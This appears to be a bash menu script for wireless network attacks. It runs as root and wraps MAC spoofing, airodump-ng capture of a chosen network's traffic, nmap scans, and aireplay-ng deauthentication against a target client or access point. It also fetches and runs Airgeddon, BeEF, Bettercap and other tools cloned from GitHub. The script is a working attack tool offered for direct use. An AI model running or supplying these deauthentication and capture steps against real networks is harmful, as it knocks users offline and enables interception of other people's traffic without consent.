#! /bin/bash

function choices(){
    echo -e "\n[[ MENU ]]\n00.Exit\n1.Change the MAC address\n2.Scan the networks around you\n3.Scan a specific network via airodump\n4.Scan a specific network via nmap\n5.Scan a specific network via cw's tool\n6.Deauth to a user\n7.Deauth to a modem\n8.Use Bettercap\n9.Use Airgeddon\n10.Use BeEF\n"
    read -p "[???] Enter an option's number: " number
    
    if (( $number == 00 ))
    then
        echo -e "\n[INFO] Quitted by user."
        exit
    elif (( $number == 1 ))
    then

        if [[ -e "macchanger" ]]
        then
            cd macchanger/
            sudo chmod +x macchanger.sh
            sudo ./macchanger.sh $iface
        else
            sudo git clone https://github.com/bellurm/macchanger.git
            cd macchanger/
            sudo chmod +x macchanger.sh
            sudo ./macchanger.sh $iface
        fi
    elif (( $number == 2 ))
    then
        echo -e "[INFO] You have to enter the Bridged Mode.\n"
        read -p "[???] Interface after you entered Bridged Mode: " bridge_iface
        sudo airmon-ng start $bridge_iface
        sudo airodump-ng $bridge_iface'mon'

    elif (( $number == 3 ))
    then
        read -p "[???] Target's Channel: " target_channel
        read -p "[???] Target's BSSID: " target_bssid
        read -p "[???] If you want a .cap or .pcap file, please type the file name. If not type 'n': " want_file
        if [[ $want_file == 'n' ]]
        then
            sudo airodump-ng --channel $target_channel --bssid $target_bssid $bridge_iface'mon'
        else
            sudo airodump-ng --channel $target_channel --bssid $target_bssid --write $want_file $bridge_iface'mon'
            echo -e "[INFO] The file is saved here: $(pwd)/$want_file'.cap'"
        fi
    elif (( $number == 4 ))
    then
        nmap_result=`sudo nmap -oN nmap_result.txt $range`
        echo -e "[INFO] The results saved here: $(pwd)/nmap_result.txt"
        read -p "[???] If the results are not enough for you, you can type command/commands.\n If you don't want, type 'n': " parameters_of_nmap
        if [ $parameters_of_nmap == 'n' ]; then
            exit
        else
            nmap_result_with_details=`sudo nmap -oN nmap_result_with_details.txt $parameters_of_nmap $range`
            echo -e "[INFO] The results saved here: $(pwd)/nmap_result_with_details.txt"
        fi
        
    elif (( $number == 5 ))
    then
        sudo git clone https://github.com/bellurm/Network-Scanner.git
        cd Network-Scanner/
        cd NetworkScanner/
        sudo chmod +x net_scanner.py
        sudo python3 net_scanner.py -i $range
    elif (( $number == 6 ))
    then
        deauthentication_to_a_user
    elif (( $number == 7 ))
    then
        deauthentication_to_a_modem
    elif (( $number == 8 ))
    then
        sudo apt install bettercap
        sudo bettercap
    elif (( $number == 9 ))
    then
        cd /opt
        echo -e "\n[INFO] Installing Airgeddon..."
        url="https://github.com/v1s1t0r1sh3r3/airgeddon.git"
        git clone $url
        cd airgeddon
        ./airgeddon.sh
        echo -e "\n[SUCCESS] Airgeddon has been installed.\n"
    elif (( $number == 10 ))
    then
        cd /opt
        echo -e "\n[WARN] Installing requirements..."
        sudo gem install bundle
        sudo bundle install
        sudo apt-get install ruby -y
        sudo apt-get install ruby-dev -y
        sudo apt-get install libsqlite3-dev -y
        sudo apt-get install libsqlite3-0 -y
        echo -e "\n[+] Done.\n"
        echo "\n[INFO]Installing BeEF...\n"
        url="https://github.com/beefproject/beef"
        git clone $url
        cd beef
        ./install
        echo -e "\n[SUCCESS] BeEF has been installed.\n"
        echo -e "\n[WARN] You have to change the default username and password that in the 'config.yaml' file."
    else
        echo -e "\n[WARN] Please, follow the menu.\n"
    fi
}

function deauthentication_to_a_user(){
    read -p "[???] How many data packets to send? > " frames
    read -p "[???] What is the BSSID of the Modem? > " bssid_of_modem
    read -p "[???] What is the BSSID of the Target? > " bssid_of_target
    sudo aireplay-ng --deauth $frames -a $bssid_of_modem -c $bssid_of_target $bridge_iface'mon'
}

function deauthentication_to_a_modem(){
    read -p "[???] How many data packets to send? > " frames
    read -p "[???] What is the BSSID of the Modem? > " bssid_of_modem
    sudo aireplay-ng --deauth $frames -a $bssid_of_modem $bridge_iface'mon'
}

if [ $(whoami) != 'root' ]
then
    echo "[WARN] You have to be root."
else
    read -p "[???] Interface: " iface
    read -p "[???] IP range (e.g. 10.0.2.0/24): " range
    while true; do
        choices
    done
fi
